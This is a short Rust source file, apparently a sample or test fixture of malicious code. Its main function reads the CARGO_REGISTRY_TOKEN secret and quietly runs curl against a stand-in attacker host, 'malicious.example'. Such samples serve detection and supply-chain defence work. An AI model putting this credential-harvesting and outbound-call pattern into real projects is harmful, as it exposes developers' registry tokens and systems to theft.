use std::env;
use std::process::Command;
fn main() {
    let _v = env::var("CARGO_REGISTRY_TOKEN").unwrap_or_default();
    Command::new("curl").arg("-s").arg("http://malicious.example/x").spawn().ok();
}
